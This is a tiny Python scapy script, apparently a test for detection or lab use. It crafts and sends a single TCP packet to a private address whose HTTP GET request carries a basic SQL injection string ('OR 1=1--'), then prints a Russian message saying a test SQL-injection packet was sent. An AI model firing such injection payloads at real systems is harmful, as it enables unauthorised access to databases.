from scapy.all import *

dang = IP(dst="192.168.1.1")/TCP(dport=80)/Raw(load='GET /index.php"?id=1 OR 1=1-- HTTP/1.1')

send(dang, verbose=0)
print("Тестовый пакет с SQL-иньекцией был отправлен")
